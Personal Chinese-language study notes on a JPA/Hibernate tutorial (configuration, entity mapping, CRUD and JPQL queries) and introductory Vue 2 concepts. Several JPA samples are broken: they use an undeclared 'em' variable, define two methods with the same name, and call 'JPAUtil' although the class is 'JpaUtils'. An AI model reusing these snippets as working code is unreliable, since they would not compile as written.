> 		4.配置实体类和表，类中属性和表中字段的映射关系
> 		5.案例：保存客户到数据库中
> ii.完成基本CRUD案例
> 		persist ： 保存
> 		merge ： 更新
> 		remove ： 删除
> 		find/getRefrence ： 根据id查询
> 		
> iii.jpql查询
> 		sql：查询的是表和表中的字段
> 		jpql：查询的是实体类和类中的属性
> 		* jpql和sql语句的语法相似
> 		
> 		1.查询全部
> 		2.分页查询
> 		3.统计查询
> 		4.条件查询
> 		5.排序
> ```

##### i.搭建环境

> - i.搭建环境
>
>   - 创建maven工程导入maven坐标
>
>     ```xml
>     	<properties>
>             <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
>             <project.hibernate.version>5.0.7.Final</project.hibernate.version>
>         </properties>
>     
>         <dependencies>
>             <!-- junit -->
>             <dependency>
>                 <groupId>junit</groupId>
>                 <artifactId>junit</artifactId>
>                 <version>4.12</version>
>                 <scope>test</scope>
>             </dependency>
>     
>             <!-- hibernate对jpa的支持包 -->
>             <dependency>
>                 <groupId>org.hibernate</groupId>
>                 <artifactId>hibernate-entitymanager</artifactId>
>                 <version>${project.hibernate.version}</version>
>             </dependency>
>     
>             <!-- c3p0 -->
>             <dependency>
>                 <groupId>org.hibernate</groupId>
>                 <artifactId>hibernate-c3p0</artifactId>
>                 <version>${project.hibernate.version}</version>
>             </dependency>
>     
>             <!-- log日志 -->
>             <dependency>
>                 <groupId>log4j</groupId>
>                 <artifactId>log4j</artifactId>
>                 <version>1.2.17</version>
>             </dependency>
>     
>             <!-- Mysql and MariaDB -->
>             <dependency>
>                 <groupId>mysql</groupId>
>                 <artifactId>mysql-connector-java</artifactId>
>                 <version>5.1.6</version>
>             </dependency>
>         </dependencies>
>     ```
>
>   - 配置JPA核心配置文件，resources文件夹下创建META-INF文件夹，创建persistence.xml文件
>
>     此时该文件空白，我们需要先加约束模板，在META-INF文件夹右键>NEW>Edit File Templates
>
>     ![image-20220114111604528](Akio's Book.assets/image-20220114111604528.png)
>
>     <img src="Akio's Book.assets/image-20220114111701109.png" alt="image-20220114111701109" style="zoom:50%;" />
>
>     other>JPA>Deployment descriptors>persistence_2_0.xml，赋值其中内容粘贴到我们的persistence.xml
>
>     ```xml
>     <?xml version="1.0" encoding="UTF-8"?>
>     <persistence xmlns="http://java.sun.com/xml/ns/persistence" version="2.0">
>         <!--配置persistence-unit节点
>             持久化单元：
>     		    name：持久化单元名称
>     		    transaction-type：事务类型
>                     RESOURCE_LOCAL：本地事务管理
>                     JTA：分布式事务管理
>         -->
>         <persistence-unit name="myJpa" transaction-type="RESOURCE_LOCAL">
>             <!--配置JPA规范的服务提供商 -->
>             <provider>org.hibernate.jpa.HibernatePersistenceProvider</provider>
>             <!--数据库信息-->
>             <!--可选配置：配置jpa实现方的配置信息-->
>             <properties>
>                 <!-- 数据库驱动 -->
>                 <property name="javax.persistence.jdbc.driver" value="com.mysql.jdbc.Driver" />
>                 <!-- 数据库地址 -->
>                 <property name="javax.persistence.jdbc.url" value="jdbc:mysql://localhost:3306/springdata_jpa?characterEncoding=utf8" />
>                 <!-- 数据库用户名 -->
>                 <property name="javax.persistence.jdbc.user" value="root" />
>                 <!-- 数据库密码 -->
>                 <property name="javax.persistence.jdbc.password" value="root" />
>     
>                 <!--jpa提供者的可选配置：我们的JPA规范的提供者为hibernate，所以jpa的核心配置中兼容hibernate的配置 -->
>                 <!--显示/打印sql-->
>                 <property name="hibernate.show_sql" value="true" />
>                 <!--格式化sql-->
>                 <property name="hibernate.format_sql" value="true" />
>                 <!--自动创建数据库表
>                         create:程序运行时创建表（如果有表，先删除再创建）
>                         update:程序运行时创建表(如果有表不会创建，只会更新/追加)
>                         none:不会创建表-->
>                 <property name="hibernate.hbm2ddl.auto" value="create" />
>             </properties>
>         </persistence-unit>
>     
>     </persistence>
>     ```
>
>   - 编写客户的实体类，配置实体类和表，类中属性和表中字段的映射关系
>
>     ```java
>     package com.shenhua.domain;
>     
>     import lombok.AllArgsConstructor;
>     import lombok.Data;
>     import lombok.NoArgsConstructor;
>     
>     import javax.persistence.*;
>     import java.io.Serializable;
>     
>     /**
>      * @Desp If you have any questions,please contact hao.shi3@dxc.com
>      * @Author hshi20
>      * @Created 2022/1/14 11:32
>      */
>     /*
>         客户的实体类
>             配置映射关系
>                 1.实体类和表的映射关系
>                     @Entity:声明当前类为实体类
>                     @Table:配置实体类和表的映射关系，你想让当前实体类和那个表产生映射关系
>                         name:配置数据库表的名称
>                 2.实体类中属性和表中字段的映射关系
>                     @Id:声明主键配置
>                     @GeneratedValue:配置主键的生成策略
>                          strategy
>                               GenerationType.IDENTITY : 自增，(mysql)
>                                      前提 : 底层数据库必须支持自动增长（底层数据库支持的自动增长方式，对id自增），如mysql
>                               GenerationType.SEQUENCE : 序列，(oracle)
>                                      前提 : 底层数据库必须支持序列，如oracle
>                               GenerationType.TABLE : jpa提供的一种机制，通过一张数据库表的形式帮助我们完成主键自增
>                               GenerationType.AUTO : 由程序自动的帮助我们选择主键生成策略
>                     @Column:配置属性和字段的映射关系
>                         name:数据库表中字段名
>      */
>     @Data
>     @NoArgsConstructor
>     @AllArgsConstructor
>     @Entity
>     @Table(name = "cst_customer")
>     public class Customer implements Serializable {
>         @Id
>         @GeneratedValue(strategy = GenerationType.IDENTITY) //配置主键的生成策略
>         @Column(name="cust_id") //指定和表中cust_id字段的映射关系
>         private Long custId;//客户主键
>         @Column(name="cust_name")
>         private String custName;//客户名称
>         @Column(name="cust_source")
>         private String custSource;//客户来源
>         @Column(name="cust_industry")
>         private String custIndustry;//客户所属行业
>         @Column(name="cust_level")
>         private String custLevel;//客户级别
>         @Column(name="cust_address")
>         private String custAddress;//客户地址
>         @Column(name="cust_phone")
>         private String custPhone;//客户联系方式
>     }
>     ```
>
>   - 测试JPA的保存，案例：保存一个客户到数据库中
>
>     <img src="Akio's Book.assets/image-20220114141458144.png" alt="image-20220114141458144" style="zoom:53%;" />
>
>     ```java
>     public class JpaTest {
>         /**
>          * 测试Jpa的保存
>          *      案例：保存一个客户到数据库中
>          */
>         /*
>          Jpa操作的操作步骤
>     		1.加载配置文件创建实体管理器工厂
>     			Persisitence：静态方法（根据持久化单元名称创建实体管理器工厂）
>     				createEntityMnagerFactory（持久化单元名称）
>     			作用：创建实体管理器工厂
>                                                                     
>     		2.根据实体管理器工厂，创建实体管理器
>     			EntityManagerFactory ：获取EntityManager对象
>     			方法：createEntityManager
>     			* 内部维护的很多的内容
>     				内部维护了数据库信息，
>     				维护了缓存信息
>     				维护了所有的实体管理器对象
>     				再创建EntityManagerFactory的过程中会根据配置创建数据库表
>     			* EntityManagerFactory的创建过程比较浪费资源
>     			特点：线程安全的对象
>     				多个线程访问同一个EntityManagerFactory不会有线程安全问题
>     			* 如何解决EntityManagerFactory的创建过程浪费资源（耗时）的问题？
>     			思路：创建一个公共的EntityManagerFactory的对象
>     			* 静态代码块的形式创建EntityManagerFactory
>                                                                     
>     		3.创建事务对象，开启事务
>     			EntityManager对象：实体类管理器
>     				beginTransaction : 创建事务对象
>     				presist ： 保存
>     				merge  ： 更新
>     				remove ： 删除
>     				find/getRefrence ： 根据id查询
>                                                                     
>     			Transaction 对象 ： 事务
>     				begin：开启事务
>     				commit：提交事务
>     				rollback：回滚
>     		4.增删改查操作
>     		5.提交事务
>     		6.释放资源
>          */
>         @Test
>         public void testSave() {
>             /**
>              * 创建实体管理类工厂，借助Persistence的静态方法获取
>              * 		其中传递的参数为持久化单元名称，需要jpa配置文件中指定
>              */
>             EntityManagerFactory factory = Persistence.createEntityManagerFactory("myJpa");
>             //创建实体管理类
>             EntityManager em = factory.createEntityManager();
>             //获取事务对象
>             EntityTransaction tx = em.getTransaction();
>             //开启事务
>             tx.begin();
>             Customer customer = new Customer();
>             customer.setCustName("北京大学");
>             //保存操作
>             em.persist(customer);
>             //提交事务
>             tx.commit();
>             //释放资源
>             em.close();
>             factory.close();
>         }
>     }
>     ```
>
>     点击运行，可以详细看到执行过程中的一些sql语句
>
>     <img src="Akio's Book.assets/image-20220114164700716.png" alt="image-20220114164700716" style="zoom:50%;" />
>
>     <img src="Akio's Book.assets/image-20220114164751475.png" alt="image-20220114164751475" style="zoom:60%;" />
>
>     ---
>
>     **常用注解：**
>
>     > ```java
>     > 	    @Entity
>     >         	作用：指定当前类是实体类。
>     >         @Table
>     >         	作用：指定实体类和表之间的对应关系。
>     >         	属性：
>     >         		name：指定数据库表的名称
>     >         @Id
>     >         	作用：指定当前字段是主键。
>     >         @GeneratedValue
>     >         	作用：指定主键的生成方式。。
>     >         	属性：
>     >         		strategy ：指定主键生成策略。
>     >         @Column
>     >         	作用：指定实体类属性和数据库表之间的对应关系
>     >         	属性：
>     >         		name：指定数据库表的列名称。
>     >         		unique：是否唯一  
>     >         		nullable：是否可以为空  
>     >         		inserttable：是否可以插入  
>     >         		updateable：是否可以更新  
>     >         		columnDefinition: 定义建表时创建此列的DDL  
>     >         		secondaryTable: 从表名。如果此列不建在主表上（默认建在主表），该属性定义该列所在从表的名字搭建开发环境[重点]
>     > ```

##### ii.完成基本CRUD案例

> - ii.完成基本CRUD案例
>
>   - 上面代码演示了基本的方法，但比较繁琐，我们可以创建一个JpaUtils工具类
>
>     ```java
>     package com.shenhua.utils;
>     /*
>         解决实体管理器工厂的浪费资源和耗时问题
>             通过静态代码块的形势，当程序第一次访问此工具类时，创建一个公共的实体管理器工厂对象
>     
>         第一次访问getEntityManager方法：经过静态代码块建一个factory对象，再调用方法创建一个EntityManager对象
>         第二次方法getEntityManager方法：直接通过一个已经创建好的factory对象，创建EntityManager对象
>      */
>     public class JpaUtils {
>         // JPA的实体管理器工厂：相当于Hibernate的SessionFactory
>         private static EntityManagerFactory em;
>         // 使用静态代码块赋值
>         static {
>             // 注意：该方法参数必须和persistence.xml中persistence-unit标签name属性取值一致
>             em = Persistence.createEntityManagerFactory("myJpa");
>         }
>     
>         /**
>          * 使用管理器工厂生产一个管理器对象
>          *
>          * @return
>          */
>         public static EntityManager getEntityManager() {
>             return em.createEntityManager();
>         }
>     }
>     ```
>
>   - 接下来我们利用这个JpaUtil工具类来进行操作CRUD
>
>     ```java
>     /**
>     	 * 保存一个实体
>     	 */
>     	@Test
>     	public void testAdd() {
>     		// 定义对象
>     		Customer c = new Customer();
>     		c.setCustName("传智学院");
>     		c.setCustLevel("VIP客户");
>     		c.setCustSource("网络");
>     		c.setCustIndustry("IT教育");
>     		c.setCustAddress("昌平区北七家镇");
>     		c.setCustPhone("010-84389340");
>     		EntityManager em = null;
>     		EntityTransaction tx = null;
>     		try {
>     			// 获取实体管理对象
>     			em = JPAUtil.getEntityManager();
>     			// 获取事务对象
>     			tx = em.getTransaction();
>     			// 开启事务
>     			tx.begin();
>     			// 执行操作
>     			em.persist(c);
>     			// 提交事务
>     			tx.commit();
>     		} catch (Exception e) {
>     			// 回滚事务
>     			tx.rollback();
>     			e.printStackTrace();
>     		} finally {
>     			// 释放资源
>     			em.close();
>     		}
>     	}
>     ```
>
>     ```java
>     /**
>     	 * 修改
>     	 */
>     @Test
>         public void testMerge(){  
>             //定义对象
>             EntityManager entityManager=null;  
>             EntityTransaction tx=null;  
>             try{  
>               	//获取实体管理对象
>               	entityManager=JPAUtil.getEntityManager();
>               	//获取事务对象
>               	tx=entityManager.getTransaction();
>               	//开启事务
>               	tx.begin();
>               	//执行操作
>               	Customer c1 = em.find(Customer.class, 6L);
>               	c1.setCustName("江苏传智学院");
>              	entityManager.clear();//把c1对象从缓存中清除出去
>               	entityManager.merge(c1);
>               	//提交事务
>               	tx.commit(); 
>             }catch(Exception e){
>               	//回滚事务
>               	tx.rollback();
>               	e.printStackTrace();  
>             }finally{  
>             	//释放资源
>             	em.close();  
>             }    
>         }
>     ```
>
>     ```java
>     /**
>     	 * 删除
>     	 */
>     	@Test
>     	public void testRemove() {
>     		// 定义对象
>     		EntityManager entityManager = null;
>     		EntityTransaction tx = null;
>     		try {
>     			// 获取实体管理对象
>     			entityManager = JPAUtil.getEntityManager();
>     			// 获取事务对象
>     			tx = entityManager.getTransaction();
>     			// 开启事务
>     			tx.begin();
>     			// 执行操作
>     			Customer customer = entityManager.find(Customer.class, 6L);
>     			entityManager.remove(customer);
>     			// 提交事务
>     			tx.commit();
>     		} catch (Exception e) {
>     			// 回滚事务
>     			tx.rollback();
>     			e.printStackTrace();
>     		} finally {
>     			// 释放资源
>     			em.close();
>     		}
>     	}
>     ```
>
>     ```java
>     /**
>     	 * 查询一个： 使用立即加载的策略
>     	 */
>     	@Test
>     	public void testGetOne() {
>     		// 定义对象
>     		EntityManager em = null;
>     		EntityTransaction tx = null;
>     		try {
>     			// 获取实体管理对象
>     			em = JPAUtil.getEntityManager();
>     			// 获取事务对象
>     			tx = em.getTransaction();
>     			// 开启事务
>     			tx.begin();
>     			// 执行操作
>     			Customer c1 = em.find(Customer.class, 1L);
>     			// 提交事务
>     			tx.commit();
>     			System.out.println(c1); // 输出查询对象
>     		} catch (Exception e) {
>     			// 回滚事务
>     			tx.rollback();
>     			e.printStackTrace();
>     		} finally {
>     			// 释放资源
>     			em.close();
>     		}
>     	}
>                                                                     
>     	// 查询实体的缓存问题
>     	@Test
>     	public void testGetOne() {
>     		// 定义对象
>     		EntityManager em = null;
>     		EntityTransaction tx = null;
>     		try {
>     			// 获取实体管理对象
>     			em = JPAUtil.getEntityManager();
>     			// 获取事务对象
>     			tx = em.getTransaction();
>     			// 开启事务
>     			tx.begin();
>     			// 执行操作
>     			Customer c1 = em.find(Customer.class, 1L);
>     			Customer c2 = em.find(Customer.class, 1L);
>     			System.out.println(c1 == c2);// 输出结果是true，EntityManager也有缓存
>     			// 提交事务
>     			tx.commit();
>     			System.out.println(c1);
>     		} catch (Exception e) {
>     			// 回滚事务
>     			tx.rollback();
>     			e.printStackTrace();
>     		} finally {
>     			// 释放资源
>     			em.close();
>     		}
>     	}
>     ```

###### 延迟加载和立即加载

> find/getRefrence ： 根据id查询
>
> 前面可能有人问，为啥两个方法都可以根据id进行查询，那么这两个方法有什么不同吗
>
> 使用find方法查询（立即加载）:
> 		1.查询的对象就是当前客户对象本身
> 		2.在调用find方法的时候，就会发送sql语句查询数据库
>
> 使用getReference方法查询（延迟加载/懒加载）(常用)：
> 		1.获取的对象是一个动态代理对象
> 		2.调用getReference方法不会立即发送sql语句查询数据库；当调用查询结果对象的时候，才会发送查询的sql语句；什么时候用，什么时候发哦是那个sql语句查询数据库
>
> ```java
>  	@Test
>     public void testFind(){
>         //1、通过工具类获取entityManager
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction tx = entityManager.getTransaction();
>         tx.begin();
>         //3、增删改查 --根据id查询客户
>         /*
>             find:根据id查询数据
>                 class:查询数据的结果需要包装的实体类类型的字节码
>                 id:查询的主键的值
>          */
>         Customer customer = entityManager.find(Customer.class, 1L);
>         System.out.println(customer);
>         //4、提交事务
>         tx.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> 
>     @Test
>     public void testReference(){
>         //1、通过工具类获取entityManager
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction tx = entityManager.getTransaction();
>         tx.begin();
>         //3、增删改查 --根据id查询客户
>         /*
>             getReference:根据id查询数据
>                 class:查询数据的结果需要包装的实体类类型的字节码
>                 id:查询的主键的值
>          */
>         Customer customer = entityManager.getReference(Customer.class, 1L);
>         System.out.println(customer);
>         //4、提交事务
>         tx.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> ```

##### iii.jpql查询

###### 1.查询全部
> ```java
> /*
>         查询全部
>             jpql: from com.shenhua.domain.Customer
>             sql: select * from cst_customer
>      */
>     @Test
>     public void findAll() {
>         //1、获取entityManager对象
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction transaction = entityManager.getTransaction();
>         transaction.begin();
>         //3、查询全部
>         String jpql = "from com.shenhua.domain.Customer";
>         Query query = entityManager.createQuery(jpql);
>         //发送查询，并封装结果
>         List list = query.getResultList();
>         for (Object obj : list) {
>             System.out.println(obj);
>         }
>         //4、提交事务
>         transaction.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> 
>    /*
>         倒序查询
>             jpql: from com.shenhua.domain.Customer order by custId desc (custId实体类的属性名)
>             sql: select * from cst_customer order by cust_id Desc (cust_id数据库字段名)
>      */
> ```

###### 2.统计查询

> ```java
> /*
> 		统计查询
> 		jpql: select count(custId) from Customer
> 		sql: select count(cust_id) from cst_customer
> 	*/
>     @Test
>     public void testCount(){
>         //1、获取entityManager对象
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction transaction = entityManager.getTransaction();
>         transaction.begin();
>         //3、计数
>         String jpql = "select count(custId) from Customer";
>         Query query = entityManager.createQuery(jpql);
>         //发送查询，并封装结果
>         /*
>             getResult : 直接将查询结果封装为list集合
>             getSingleResult : 得到唯一的结果集
>          */
>         Object singleResult = query.getSingleResult();
>         System.out.println(singleResult);
>         //4、提交事务
>         transaction.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> ```

###### 3.分页查询

> ```java
> /*
> 		分页查询
> 		jpql: from Customer
> 		sql: select * from cst_customer limit ?,?
> 	*/
>     @Test
>     public void testPaged(){
>         //1、获取entityManager对象
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction transaction = entityManager.getTransaction();
>         transaction.begin();
>         //3、分页全部
>         String jpql = "from Customer";
>         Query query = entityManager.createQuery(jpql);
>         //对参数赋值 -- 分页参数
>         //起始索引
>         query.setFirstResult(0);
>         //每页查询的条数
>         query.setMaxResults(2);
>         //发送查询，并封装结果
>         List list = query.getResultList();
>         for (Object obj : list) {
>             System.out.println(obj);
>         }
>         //4、提交事务
>         transaction.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> ```

###### 4.条件查询

> ```java
> /*
> 		条件查询
> 		jpql: from Customer where custName like ?
> 		sql: select * from cst_customer where cust_name like ?
> 	*/
>     @Test
>     public void testCondition(){
>         //1、获取entityManager对象
>         EntityManager entityManager = JpaUtils.getEntityManager();
>         //2、开启事务
>         EntityTransaction transaction = entityManager.getTransaction();
>         transaction.begin();
>         //3、条件查询
>         String jpql = "from Customer where custName like ?";
>         Query query = entityManager.createQuery(jpql);
>         //对参数赋值 -- 占位符参数
>         //setParameter(占位符?的索引位置从1开始, 取值)
>         query.setParameter(1, "清华%");
>         //发送查询，并封装结果
>         List list = query.getResultList();
>         for (Object obj : list) {
>             System.out.println(obj);
>         }
>         //4、提交事务
>         transaction.commit();
>         //5、释放资源
>         entityManager.close();
>     }
> ```
>
> 





## IText





## VUE2+3

https://www.bilibili.com/video/BV1Zy4y1K7SH?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click

### VUE简介

英文官网: https://vuejs.org/      中文官网: https://cn.vuejs.org/

#### 什么是VUE

> <img src="Akio's Book.assets/image-20220119095952263.png" alt="image-20220119095952263" style="zoom:50%;" />



#### VUE特点

> 1、采用**组件化**模块，提高代码复用率，且然代码更好维护（如下图，如果别人想用我Activity模块的直接引入Activity.vue即可，功能样式都齐全）
> <img src="Akio's Book.assets/image-20220119095753131.png" alt="image-20220119095753131" style="zoom:50%;" />
>
> 2、声明式编码
>
> <img src="Akio's Book.assets/image-20220120145607551.png" alt="image-20220120145607551" style="zoom:67%;" />
>
> ---
>
> <img src="Akio's Book.assets/image-20220120145938244.png" alt="image-20220120145938244" style="zoom:50%;" />



#### vue官网指南

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=3&spm_id_from=pageDriver



#### 安装vue.js.devtools

如果没有安装这个扩展工具，每次运行vue程序都会子啊控制台友善的提醒你，安装完成之后就不会提示了；第二个提示是提示你不要在生产环境上使用vue.js，而要去使用vue.min.js。

<img src="Akio's Book.assets/image-20220120151729887.png" alt="image-20220120151729887" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220120151523125.png" alt="image-20220120151523125" style="zoom:50%;" />

<img src="Akio's Book.assets/image-20220120164537754.png" alt="image-20220120164537754" style="zoom:50%;" />

如果要关闭提示怎么办呢？

控制台输入Vue.config，主要关注productionTip:true

<img src="Akio's Book.assets/image-20220120152123327.png" alt="image-20220120152123327" style="zoom:53%;" />

在API中是如下介绍的https://cn.vuejs.org/v2/api/#productionTip

<img src="Akio's Book.assets/image-20220120152256990.png" alt="image-20220120152256990" style="zoom:50%;" />

这个选项变为false就不会有控制台提示了，可以在代码中设置一下

<img src="Akio's Book.assets/image-20220120152322114.png" alt="image-20220120152322114" style="zoom:50%;" />



#### 初识VUE

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>初识Vue</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			初识Vue：
				1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
				2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
				3.root容器里的代码被称为【Vue模板】；
				4.Vue实例和容器是一一对应的，一个Vue实例只能接管一个容器；
				5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
				6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
				7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

				注意区分：js表达式 和 js代码(语句)
						1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
									(1). a
									(2). a+b
									(3). demo(1)
									(4). x === y ? 'a' : 'b'

						2.js代码(语句)
									(1). if(){}
									(2). for(){}
		-->

		<!-- 准备好一个容器 -->
		<div id="demo">
			<h1>Hello，{{name.toUpperCase()}}，{{address}}</h1>
		</div>

		<script type="text/javascript" >
			Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

			//创建Vue实例
			new Vue({
				el:'#demo', //el用于指定当前Vue实例为哪个容器服务(建立实例与容器的关联)，值通常为css选择器字符串。
				// el:document.getElementById('demo'), //也可以
				data:{ //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
					name:'atguigu',
					address:'北京'
				}
			})

		</script>
	</body>
</html>
```



#### VUE模板语法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}</a>
			<a :href="school.url" x="hello">点我去{{school.name}}</a>
             <!-- :href="school.url"就把school.url当成js表达式执行，而不是字符串 -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'jack',
				school:{
					name:'猛虎堂',
					url:'http://www.atguigu.com',
				}
			}
		})
	</script>
</html>
```



#### 数据绑定

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>数据绑定</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			Vue中有2种数据绑定的方式：
					1.单向绑定(v-bind)：数据只能从data流向页面。
					2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
						备注：
								1.双向绑定一般都应用在表单类元素上（如：input、select等）
								2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<!-- 普通写法 -->
			<!-- 单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/> -->

			<!-- 简写 -->
			单向数据绑定：<input type="text" :value="name"><br/>
			双向数据绑定：<input type="text" v-model="name"><br/>

			<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
			<!-- <h2 v-model:x="name">你好啊</h2> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			}
		})
	</script>
</html>
```



#### el和data的两种写法

el的两种写法

```javascript
const v = new Vue({
    //el:'#root', //第一种写法
    data:{
        name:'???'
    }
})
v.$mount('#root') //第二种写法 */
为什么是$mount？
因为容器将模板交给vue实例，实例进行解析，解析完成后的内容挂载到容器中，mount有挂载的意思
```

```javascript
<script type="text/javascript">
    //el的两种写法
    const v = new Vue({
        //el:'#root', //第一种写法
        data:{
            name:'???'
        }
    })
    console.log(v)
    setTimeout(()=>{	//写一个定时器，1s后才会显示数据
        v.$mount('#root') //第二种写法 */
    },1000)
</script>
```

vue打印出来

<img src="Akio's Book.assets/image-20220120171937999.png" alt="image-20220120171937999" style="zoom:50%;" />

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{//必须要求返回
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```



#### 理解MVVM

> 1. M：模型(Model) ：对应 data 中的数据 
> 2. V：视图(View) ：模板 
> 3. VM：视图模型(ViewModel) ： Vue 实例对象
>
> <img src="Akio's Book.assets/image-20220120173213145.png" alt="image-20220120173213145" style="zoom:67%;" />
>
> ```html
> <!DOCTYPE html>
> <html>
> 	<head>
> 		<meta charset="UTF-8" />
> 		<title>理解MVVM</title>
> 		<!-- 引入Vue -->
> 		<script type="text/javascript" src="../js/vue.js"></script>
> 	</head>
> 	<body>
> 		<!-- 
> 			MVVM模型
> 						1. M：模型(Model) ：data中的数据
> 						2. V：视图(View) ：模板代码
> 						3. VM：视图模型(ViewModel)：Vue实例
> 			观察发现：
> 						1.data中所有的属性，最后都出现在了vm身上。
> 						2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
> 		-->
> 		<!-- 准备好一个容器-->
> 		<div id="root">
> 			<h1>学校名称：{{name}}</h1>
> 			<h1>学校地址：{{address}}</h1>
> 			<!-- <h1>测试一下1：{{1+1}}</h1>
> 			<h1>测试一下2：{{$options}}</h1>	<!-- 都能取到值 -->
> 			<h1>测试一下3：{{$emit}}</h1>
> 			<h1>测试一下4：{{_c}}</h1> -->
> 		</div>
> 	</body>
> 
> 	<script type="text/javascript">
> 		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
> 
> 		const vm = new Vue({
> 			el:'#root',
> 			data:{
> 				name:'湖畔大学',
> 				address:'杭州',
> 			}
> 		})
> 		console.log(vm)
> 	</script>
> </html>
> ```
>
> <img src="Akio's Book.assets/image-20220120173637253.png" alt="image-20220120173637253" style="zoom:67%;" />



#### 数据代理

##### Object.defineproperty方法

> https://www.bilibili.com/video/BV1Zy4y1K7SH?p=11&spm_id_from=pageDriver

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>回顾Object.defineproperty方法</title>
	</head>
	<body>
		<script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
				// get:function g(){ //也可以定义成方法，但一般不会这么写
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})

			// console.log(Object.keys(person))

			console.log(person)
		</script>
	</body>
</html>
```

<img src="Akio's Book.assets/image-20220120175152048.png" alt="image-20220120175152048" style="zoom:67%;" />

基本出现如上信息，就知道age靠defineproperty加进去的，有人要获取age，getter工作，有人要修改age，setter工作

##### 什么是数据代理？

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
